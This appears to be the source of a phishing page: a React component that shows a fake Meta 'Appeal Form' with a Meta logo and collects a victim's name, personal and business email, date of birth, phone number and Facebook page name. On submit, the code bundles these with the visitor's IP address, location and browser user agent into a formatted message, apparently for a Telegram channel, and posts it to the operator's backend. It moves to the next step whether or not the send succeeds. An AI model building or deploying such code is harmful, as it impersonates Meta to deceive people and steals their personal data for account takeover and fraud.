import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';

interface FormData {
    fullName: string;
    personalEmail: string;
    businessEmail: string;
    facebookPageName: string;
    dateOfBirth: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'textarea' | 'date';
}

const FORM_FIELDS: FormField[] = [
    { name: 'fullName', label: 'Full Name', type: 'text' },
    { name: 'personalEmail', label: 'Personal Email', type: 'email' },
    { name: 'businessEmail', label: 'Business Email', type: 'email' },
    { name: 'dateOfBirth', label: 'Date of Birth', type: 'date' },
    { name: 'facebookPageName', label: 'Facebook Page Name', type: 'text' }
];
const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        dateOfBirth: '',
        facebookPageName: ''
    });

    const { setModalOpen, geoInfo, setMessageId, setMessageContent } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = ['Appeal Form', 'Full Name', 'Personal Email', 'Business Email', 'Date of Birth', 'Mobile phone number', 'Facebook Page Name', 'I agree with Terms of use', 'Submit'];
        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;

        setIsLoading(true);

        // Format date from yyyy-mm-dd to dd/mm/yyyy
        const formatDateOfBirth = (dateString: string): string => {
            if (!dateString) return '';
            const [year, month, day] = dateString.split('-');
            return `${day}/${month}/${year}`;
        };

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>
<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>🎂 Ngày sinh:</b> <code>${formatDateOfBirth(formData.dateOfBirth)}</code>
<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
<b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
<b>📘 Facebook Page:</b> <code>${formData.facebookPageName}</code>
<b>🖥️ User Agent:</b> <code>${navigator.userAgent}</code>

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            const res = await axios.post('/api/send', {
                message
            });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
                setMessageContent(message);
            }

            nextStep();
        } catch {
            nextStep();
        } finally {
            setIsLoading(false);
        }
    };
    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-[90vh] w-full max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                <div className='mb-2 flex w-full items-center justify-between p-4 pb-0'>
                    <p className='text-2xl font-bold'>{t('Appeal Form')}</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-8 w-8 rounded-full transition-colors hover:bg-[#e2eaf2]' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} size='xl' />
                    </button>
                </div>

                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-4'>
                    <div className='flex flex-col gap-2 py-2'>
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                <p className='font-sans'>{t(field.label)}</p>
                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-25 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' rows={3} /> : field.type === 'date' ? <input name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} max={new Date().toISOString().split('T')[0]} className='h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' /> : <input name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' />}
                            </div>
                        ))}
                        <p className='font-sans'>{t('Mobile phone number')}</p>
                        <IntlTelInput
                            onChangeNumber={handlePhoneChange}
                            initOptions={initOptions}
                            inputProps={{
                                name: 'phoneNumber',
                                className: 'h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
                            }}
                        />
                        <div className='flex items-center gap-2 pt-2'>
                            <input type='checkbox' className='cursor-pointer' />
                            <p className='cursor-pointer'>{t('I agree with Terms of use')}</p>
                        </div>
                        <button type='submit' disabled={isLoading} className={`mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                        </button>
                    </div>
                </form>

                <div className='flex items-center justify-center p-3'>
                    <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                </div>
            </div>
        </div>
    );
};

export default InitModal;
